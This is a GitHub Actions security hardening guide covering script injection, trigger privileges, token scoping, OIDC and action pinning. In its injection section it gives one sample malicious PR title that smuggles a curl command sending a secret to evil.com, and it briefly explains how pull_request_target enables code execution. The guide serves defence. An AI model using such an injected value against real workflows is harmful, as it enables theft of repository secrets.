# GitHub Actions Security Hardening

## Overview

GitHub Actions workflows execute with direct access to repository code, secrets, and system tokens. Securing workflows requires understanding the Actions-specific threat model: string interpolation before shell execution, trigger privilege boundaries, token scoping, and third-party action mutability.

---

## 1. Script Injection Sinks & The Safe Pattern

### The Vulnerability
In a workflow step, expressions enclosed in `${{ <expr> }}` are substituted by the runner as raw text before the shell process starts. When an expression contains attacker-controlled data, it results in direct shell command injection.

```yaml
# VULNERABLE: Direct string interpolation into shell command
- name: Log PR Title
  run: echo "PR title is ${{ github.event.pull_request.title }}"
```
If an attacker names a PR `"; curl -X POST https://evil.com/leak -d "$SECRET" #`, the shell interprets the semicolon as a command separator and executes the payload.

### Attacker-Controllable Contexts
The following fields can be controlled by untrusted external users (e.g., any GitHub user opening a PR, issue, or comment):

| Context Field | Controlled By |
| --- | --- |
| `github.event.issue.title` / `.body` | Issue author |
| `github.event.pull_request.title` / `.body` | PR author |
| `github.event.pull_request.head.ref` / `.head.label` | PR author (branch name) |
| `github.head_ref` | PR author (branch name) |
| `github.event.comment.body` | Comment author |
| `github.event.review.body` / `.review_comment.body` | PR reviewer |
| `github.event.commits.*.message` / `head_commit.message` | Commit author |
| `github.event.commits.*.author.email` / `.name` | Commit author |
| `github.event.pages.*.page_name` | Wiki editor |

### The Safe Pattern: Bind to `env:`
Always assign untrusted expressions to step-level environment variables, then reference them as quoted shell variables (`"$VAR"`). The shell treats environment variables as data, never parsing them as syntax.

```yaml
# SAFE: Value passed via environment variable
- name: Log PR Title
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
    HEAD_REF: ${{ github.head_ref }}
  run: |
    echo "PR title is: $PR_TITLE"
    git checkout "$HEAD_REF"
```

### `actions/github-script` Sinks
The same rule applies to JavaScript execution in `actions/github-script`. Never interpolate `${{ }}` into the `script:` string. Pass data via `env:` and read `process.env`:

```yaml
# SAFE github-script pattern
- uses: actions/github-script@60a0d83039c74a4aee543508d2ffcb1c3799cdea # v7.0.1
  env:
    ISSUE_TITLE: ${{ github.event.issue.title }}
  with:
    script: |
      console.log(process.env.ISSUE_TITLE);
```

---

## 2. Trigger Privileges & The Trust Boundary

### Trigger Privilege Matrix

| Trigger | Initiator | `GITHUB_TOKEN` Scope | Secrets Access | Trust Level |
| --- | --- | --- | --- | --- |
| `push` | Collaborators | Read/Write (default) | Yes | Trusted |
| `pull_request` (same-repo) | Collaborators | Read/Write (default) | Yes | Trusted |
| `pull_request` (fork) | Public / External | Read-Only | **No** | **Untrusted (Safe by design)** |
| `pull_request_target` | Public / External | Read/Write | **Yes** | **Dangerous (Privileged)** |
| `workflow_run` | Fires after target workflow | Read/Write | **Yes** | **Dangerous (Privileged)** |
| `issue_comment`, `issues` | Public / External | Read/Write | **Yes** | **Dangerous (Privileged)** |

### Why `pull_request_target` Is High Risk
`pull_request_target` runs in the context of the base branch, granting access to secrets and a write-capable `GITHUB_TOKEN`. If a `pull_request_target` workflow checks out the PR head commit (`ref: ${{ github.event.pull_request.head.sha }}`) and executes code (e.g. `npm install`, build scripts, or test runners), outside contributors can achieve remote code execution (RCE) against the base repository.

### Safe Two-Workflow Pattern
When an untrusted PR requires building and then posting a comment or updating status using privileged tokens:

1. **Workflow 1 (Unprivileged)**: Triggered on `pull_request`. Runs untrusted code, builds assets, and uploads results as artifacts. Runs with read-only token and zero secrets.
2. **Workflow 2 (Privileged)**: Triggered on `workflow_run` when Workflow 1 completes. Downloads artifacts (treating them strictly as data, never executing them), and posts comments or updates deployments using the privileged token.

---

## 3. Least-Privilege `GITHUB_TOKEN` Permissions

### Deny by Default
If a workflow omits a `permissions:` block, it inherits organization or repository defaults, which often default to read/write across all scopes. Every workflow must declare a top-level `permissions:` block.

```yaml
# Top-level: Deny all permissions by default
permissions: {}

jobs:
  lint:
    permissions:
      contents: read       # Checkout only
    runs-on: ubuntu-latest
    steps: [...]

  publish-pr-comment:
    permissions:
      pull-requests: write # Comment on PRs only
    runs-on: ubuntu-latest
    steps: [...]
```

### Available Permission Scopes
Common scopes: `contents`, `pull-requests`, `issues`, `actions`, `packages`, `id-token`, `deployments`, `checks`, `statuses`. Values are `read`, `write`, or `none`.

### OpenID Connect (OIDC) Over Static Credentials
Never store long-lived cloud keys (e.g., `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`) as repository secrets. Use OIDC with short-lived tokens:

```yaml
permissions:
  id-token: write          # Required for OIDC exchange
  contents: read
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: aws-actions/configure-aws-credentials@e3ddf4a3c70b81804c21c7288c531a3934b023d5 # v4.0.2
        with:
          role-to-assume: arn:aws:iam::123456789012:role/ci-deploy-role
          aws-region: us-east-1
```

---

## 4. Supply Chain: Action Pinning & Runner Hygiene

### Pin to Immutable 40-Character Commit SHAs
Tags (`@v4`) and branches (`@main`) are mutable git references. If an upstream maintainer account or repository is compromised, tags can be moved to malicious commits without warning.

```yaml
# VULNERABLE: Mutable tag reference
- uses: actions/checkout@v4

# HARDENED: Immutable full commit SHA with trailing version comment
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
```

- **Third-party actions**: MUST be pinned to 40-character commit SHAs.
- **First-party actions (`actions/*`)**: Strongly recommended to pin to commit SHAs.
- **Trailing Comment**: Always append `# vX.Y.Z` for human review and Dependabot compatibility.

### Checkout Credential Persistence
`actions/checkout` persists the runner `GITHUB_TOKEN` in `.git/config` by default. If subsequent steps execute untrusted code or third-party binaries, they can read the token. Set `persist-credentials: false` unless git push is explicitly required:

```yaml
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
  with:
    persist-credentials: false
```

### Self-Hosted Runners
Never use self-hosted runners on public repositories for workflows that can be triggered by forks. Public PRs executing on self-hosted runners can persist backdoors, read adjacent repositories, or pivot into local private networks.
